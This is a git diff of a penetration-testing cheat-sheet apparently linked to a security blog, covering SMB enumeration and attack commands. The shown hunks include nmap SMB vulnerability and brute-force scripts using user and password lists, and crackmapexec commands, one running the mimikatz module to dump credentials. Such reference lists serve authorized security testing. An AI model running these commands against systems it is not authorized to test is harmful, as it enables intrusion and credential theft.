@@ -2,6 +2,8 @@
 
 ### This is a list of useful commands/tricks using smbclient, enum4linux and nmap smb scripts - very useful on a pentesting https://sharingsec.blogspot.com
 
+$ target: if [[ ! -z $target ]]; then; echo $target; else echo ""; fi
+
 # enum smb
 echo 'echo "nmblookup -A <target>
 smbmap -H <target>
@@ -82,7 +84,8 @@ nmap -p 445 --script smb-vuln-ms06-025 --script smb-vuln-ms07-029 --script smb-v
 # map - Brute Force Accounts (be aware of account lockout!)
 nmap –p 445 --script smb-brute –script-args userdb=user-list.txt,passdb=pass-list.txt <target>
 
-# using cme with mimikatz
+# using mimikatz with cme
 crackmapexec smb <target> -u <username> -p '<password>' -M mimikatz
 
-$ target: if [[ ! -z $target ]]; then; echo $target; else echo ""; fi
+# Bruteforcing with crackmapexec
+crackmapexec smb <target> -u <username> -p '<password>'
